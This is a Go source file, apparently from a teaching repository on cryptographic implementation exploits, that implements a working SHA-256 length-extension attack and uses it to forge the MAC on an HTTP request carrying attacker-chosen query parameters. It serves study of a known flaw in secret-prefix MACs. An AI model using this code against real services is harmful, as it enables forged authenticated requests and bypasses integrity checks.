package exploit_length_ext

/*
#cgo pkg-config: openssl
#include <openssl/sha.h>
*/
import "C"

import (
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"errors"
	"fmt"
	"net/http"
	"net/url"
	"sort"
	"strings"
	"unsafe"

	"github.com/krkhan/crypto-impl-exploit/ch06/length_ext/impl_length_ext"
)

func generatePadding(msgLen uint64) []byte {
	zerosLen := int(sha256.BlockSize - 9 - (msgLen % sha256.BlockSize))
	if zerosLen < 0 {
		zerosLen = sha256.BlockSize - 9
	}
	padding := make([]byte, 9+zerosLen)
	padding[0] = 0x80
	binary.BigEndian.PutUint64(padding[1+zerosLen:], msgLen*8)
	return padding
}

func consumeUint32(buffer []byte) ([]byte, C.uint) {
	i := uint32(buffer[3]) | uint32(buffer[2])<<8 | uint32(buffer[1])<<16 | uint32(buffer[0])<<24
	return buffer[4:], C.uint(i)
}

func ExtendSha256(originalMsgLen uint64, originalDigest []byte, newData []byte) ([]byte, error) {
	if len(originalDigest) != sha256.Size {
		return nil, errors.New("invalid length for original digest")
	}

	padding := generatePadding(originalMsgLen)

	var ctx C.SHA256_CTX
	C.SHA256_Init(&ctx)
	dummyData := make([]C.uchar, sha256.BlockSize)
	for i := 0; i < len(dummyData); i++ {
		dummyData[i] = 'A'
	}
	C.SHA256_Update(&ctx, unsafe.Pointer(&dummyData[0]), C.size_t(len(dummyData)))

	originalDigest, ctx.h[0] = consumeUint32(originalDigest)
	originalDigest, ctx.h[1] = consumeUint32(originalDigest)
	originalDigest, ctx.h[2] = consumeUint32(originalDigest)
	originalDigest, ctx.h[3] = consumeUint32(originalDigest)
	originalDigest, ctx.h[4] = consumeUint32(originalDigest)
	originalDigest, ctx.h[5] = consumeUint32(originalDigest)
	originalDigest, ctx.h[6] = consumeUint32(originalDigest)
	originalDigest, ctx.h[7] = consumeUint32(originalDigest)

	totalBytes := originalMsgLen + uint64(len(padding))
	C.SHA256_Update(&ctx, unsafe.Pointer(&padding[0]), C.size_t(len(padding)))
	ctx.Nl = C.uint(totalBytes * 8)
	ctx.num = C.uint(totalBytes % sha256.BlockSize)

	C.SHA256_Update(&ctx, unsafe.Pointer(&newData[0]), C.size_t(len(newData)))
	var newDigest [C.SHA256_DIGEST_LENGTH]C.uchar
	C.SHA256_Final(&newDigest[0], &ctx)
	newDigestBytes := C.GoBytes(unsafe.Pointer(&newDigest[0]), C.SHA256_DIGEST_LENGTH)
	return newDigestBytes, nil
}

func ExtendHttpRequestMac(req *http.Request, maliciousParams map[string]string) error {
	var originalKeys []string
	for key := range req.URL.Query() {
		originalKeys = append(originalKeys, key)
	}
	sort.Strings(originalKeys)

	var originalQueryBuilder strings.Builder
	for _, key := range originalKeys {
		if key == "mac" {
			continue
		}
		originalQueryBuilder.WriteString(key)
		originalQueryBuilder.WriteString(req.URL.Query().Get(key))
	}
	originalQueryCompacted := originalQueryBuilder.String()
	originalHashInputLen := (impl_length_ext.ClientSecretLength * 2) + len(originalQueryCompacted)
	padding := generatePadding(uint64(originalHashInputLen))
	fmt.Printf("\t\toriginalQueryCompacted: %s\n", originalQueryCompacted)

	originalQueryWithPadding := fmt.Sprintf("%s%s", originalQueryCompacted, padding)

	maliciousQuery := make(url.Values)
	var maliciousKeys []string
	for key, value := range maliciousParams {
		maliciousQuery.Set(key, value)
		maliciousKeys = append(maliciousKeys, key)
	}
	sort.Strings(maliciousKeys)
	var maliciousQueryBuilder strings.Builder
	for _, key := range maliciousKeys {
		maliciousQueryBuilder.WriteString(key)
		maliciousQueryBuilder.WriteString(maliciousQuery.Get(key))
	}
	maliciousQueryCompacted := maliciousQueryBuilder.String()
	fmt.Printf("\t\tmaliciousQueryCompacted: %s\n", maliciousQueryCompacted)

	originalDigest, err := hex.DecodeString(req.URL.Query().Get("mac"))
	if err != nil {
		return err
	}
	newMac, err := ExtendSha256(uint64(originalHashInputLen), originalDigest, []byte(maliciousQueryCompacted))
	if err != nil {
		return err
	}
	newMacHex := hex.EncodeToString(newMac)
	fmt.Printf("\t\tnewMac: %s\n", newMacHex)

	maliciousQuery.Set(string(originalQueryWithPadding[0]), originalQueryWithPadding[1:])
	maliciousQuery.Set("mac", newMacHex)

	req.URL.RawQuery = maliciousQuery.Encode()

	return nil
}

func printShaCtx(ctx C.SHA256_CTX) string {
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("%08x ", ctx.h[0]))
	sb.WriteString(fmt.Sprintf("%08x ", ctx.h[1]))
	sb.WriteString(fmt.Sprintf("%08x ", ctx.h[2]))
	sb.WriteString(fmt.Sprintf("%08x ", ctx.h[3]))
	sb.WriteString(fmt.Sprintf("%08x ", ctx.h[4]))
	sb.WriteString(fmt.Sprintf("%08x ", ctx.h[5]))
	sb.WriteString(fmt.Sprintf("%08x ", ctx.h[6]))
	sb.WriteString(fmt.Sprintf("%08x ", ctx.h[7]))
	sb.WriteString(fmt.Sprintf("Nh: %08x, Nl: %08x, md_len: %08x, num: %08x\n\n\n", ctx.Nh, ctx.Nl, ctx.md_len, ctx.num))
	return sb.String()
}
